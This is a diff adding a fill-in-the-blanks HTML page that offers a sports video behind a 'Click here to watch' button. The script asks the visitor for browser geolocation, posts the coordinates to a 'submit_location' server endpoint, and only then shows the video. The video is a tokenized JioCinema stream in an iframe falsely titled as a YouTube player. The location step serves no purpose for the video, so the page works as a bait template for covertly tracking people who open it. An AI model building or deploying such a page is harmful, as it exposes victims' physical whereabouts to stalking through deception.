@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>{YOUR TITLE}</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f9;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            text-align: center;
+            flex-direction: column;
+        }
+
+        .container {
+            background-color: white;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            max-width: 600px;
+            width: 90%;
+            margin-top: 20px;
+        }
+
+        h1 {
+            font-size: 24px;
+            color: #333;
+        }
+
+        button {
+            background-color: #4CAF50;
+            color: white;
+            font-size: 16px;
+            padding: 12px 24px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            margin-top: 20px;
+            transition: background-color 0.3s ease;
+        }
+
+        button:hover {
+            background-color: #45a049;
+        }
+
+        #video-container {
+            display: none;
+            margin-top: 20px;
+        }
+
+        iframe {
+            width: 100%;
+            height: 315px;
+            border-radius: 8px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            border: none;
+        }
+    </style>
+    <script>
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendLocation, showError);
+            } else {
+                alert("Geolocation is not supported by your browser.");
+            }
+        }
+
+        function sendLocation(position) {
+            const data = {
+                latitude: position.coords.latitude,
+                longitude: position.coords.longitude
+            };
+
+            fetch('submit_location', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            })
+            .then(response => response.json())
+            .then(result => {
+                if (result.status === "success") {
+                    showVideo();
+                } else {
+                    alert("Error: " + result.message);
+                }
+            })
+            .catch(error => alert("Error: " + error));
+        }
+
+        function showError(error) {
+            switch (error.code) {
+                case error.PERMISSION_DENIED:
+                    alert("User denied the permission.");
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    alert("Location information is unavailable.");
+                    break;
+                case error.TIMEOUT:
+                    alert("The request to get location timed out.");
+                    break;
+                default:
+                    alert("An unknown error occurred.");
+                    break;
+            }
+        }
+
+        function showVideo() {
+            const videoContainer = document.getElementById("video-container");
+            videoContainer.innerHTML = `
+                <iframe 
+                    width="560" 
+                    height="315" 
+                    src="https://jcevents.jiocinema.com/bpk-tv/Sports18_Khel_voot_MOB/Fallback/hdntl=exp=1735306526~acl=/*~id=aaf549ec51984c86b32dd7de3e1334c7~data=hdntl~hmac=39110d6745f41a6f9aa1a3e69e5cc4adf51893d7864df3addf7d6691e92b2ba6/Sports18_Khel_voot_MOB-audio_98838_eng=98800-video=1680400/index.m3u8" 
+                    title="YouTube video player" 
+                    frameborder="0" 
+                    allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" 
+                    allowfullscreen>
+                </iframe>`;
+            videoContainer.style.display = "block";
+        }
+    </script>
+</head>
+<body>
+    <div class="container">
+        <h1>{heading}</h1>
+        <button onclick="getLocation()">Click here to watch</button>
+        <div id="video-container"></div>
+    </div>
+</body>
+</html>
+
